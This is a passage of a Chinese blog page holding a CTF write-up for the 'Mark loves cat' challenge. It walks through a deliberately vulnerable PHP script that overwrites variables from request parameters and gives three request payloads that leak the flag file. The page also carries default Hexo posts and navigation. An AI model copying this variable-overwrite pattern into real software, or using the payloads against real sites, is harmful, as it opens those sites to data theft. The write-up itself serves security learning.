<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003094636673.png" alt="image-20251003094636673"></p>
<p>此时在githack目录下会生成一个文件</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003094706701.png" alt="image-20251003094706701"></p>
<p>打开查看里面的信息</p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003094739381.png" alt="image-20251003094739381"></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003094743417.png" alt="image-20251003094743417"></p>
<p>6.着重分析index.php里面的代码</p>
<?php

include 'flag.php';

$yds = "dog";

$is = "cat";

$handsome = 'yds';//定义初始变量

foreach($_POST as $x => $y){

  $$x = $y;

}//遍历通过 POST 方法传递的所有参数。`$$x` 是可变变量，意思是把 POST 传参中键（`$x`）作为变量名，值（`$y`）作为变量值。例如，如果 POST 传参是 `a=1`，就会执行 `$a = 1`。这样就可能覆盖之前定义的变量

foreach($_GET as $x => $y){

  $$x = $$y;

}//遍历 GET 传参，把 GET 传参的键（`$x`）作为变量名，然后将这个变量名对应的变量（`$$y`）的值赋给它。比如，GET 传参是 `x=y&y=123`，就会先取 `$y` 的值（假设之前 `$y` 是 `123`），然后执行 `$x = $y`（即 `$x = 123`）。这一步进一步增加了变量被覆盖的可能

foreach($_GET as $x => $y){

  if($_GET['flag'] === $x && $x !== 'flag'){

​    exit($handsome);

  }

}//遍历 GET 传参，检查是否存在 GET 参数 `flag` 的值等于当前遍历的键 `$x`，并且 `$x` 不等于 `'flag'`。如果满足，就输出 `$handsome` 的值然后退出程序。

if(!isset($_GET['flag']) && !isset($_POST['flag'])){

  exit($yds);

}//如果 GET 和 POST 都没有 `'flag'` 参数，就输出 `$yds`（即 `dog`）然后退出。

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){

  exit($is);

}//如果 POST 传参里的 `flag` 等于 `'flag'`，或者 GET 传参里的 `flag` 等于 `'flag'`，就输出 `$is`（即 `cat`）然后退出。

echo "the flag is: ".$flag;//如果前面的条件都不满足，就会输出 `flag` 的值。



核心解题思路

由flag.php得  $flag = file_get_contents('/flag');

在index.php中 echo "the flag is: ".$flag;

我们现在只需要输出$flag，即可得到我们想要的flag

--------核心函数exit()会返回当前值并退出,我们让其返回的值为flg即可

解法一:

if(!isset($_GET['flag']) && !isset($_POST['flag'])){

  exit($yds);

}

当get和post请求中都不存在flag键时执行exit()函数

![image-20251003100614501](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003100614501.png)

解法二:

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){

  exit($is);

}

当post或者get请求中有参数flag执行exit()

![image-20251003101902319](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251003101902319.png)

注意这里要结合之前的变量覆盖;执行第一次:$is=$flag=flag;执行第二次:$flag=$flag=null

解法三:

foreach($_GET as $x => $y){

  if($_GET['flag'] === $x && $x !== 'flag'){

​    exit($handsome);

  }

}

检查当前遍历的参数名$x是否等于get参数的flag值,并且要求当前$x不能是flag

满足条件就执行exit()

handsome=flag&flag=handsome

![img](https://i-blog.csdnimg.cn/direct/869eb6faa2764bac9e00a5d622f6d631.png)

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/03/BJDCTF2020-Mark-loves-cat1-%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95/" data-id="cmga8g4dm00009kuyh2xt4lck" data-title="[BJDCTF2020]Mark loves cat1--三种解法" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-chenge-first-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/02/chenge-first-blog/" class="article-date">
  <time class="dt-published" datetime="2025-10-02T03:25:02.000Z" itemprop="datePublished">2025-10-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/02/chenge-first-blog/">&#39;chenge-first-blog&#39;</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>大家好我是fancy!<br>具体是注册博客的第一天<br>希望多多关照</p>
<p>&lt;! –more–&gt;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/02/chenge-first-blog/" data-id="cmg8uvphq0000m0uyeoohf382" data-title="&#39;chenge-first-blog&#39;" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/02/hello-world/" class="article-date">
  <time class="dt-published" datetime="2025-10-02T02:43:51.736Z" itemprop="datePublished">2025-10-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/02/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/02/hello-world/" data-id="cmg8tfbsw0000vkuy3in0cxe1" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/05/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/">[WUSTCTF2020]朴实无华1</a>
          </li>
        
          <li>
            <a href="/2025/10/04/BUUCTF-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World-1-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/">BUUCTF [CISCN2019 华北赛区 Day2 Web1]Hack World 1(SQL注入之布尔盲注）</a>
          </li>
        
          <li>
            <a href="/2025/10/03/BJDCTF2020-Mark-loves-cat1-%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95/">[BJDCTF2020]Mark loves cat1--三种解法</a>
          </li>
        
          <li>
            <a href="/2025/10/02/chenge-first-blog/">&#39;chenge-first-blog&#39;</a>
          </li>
        
          <li>
            <a href="/2025/10/02/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>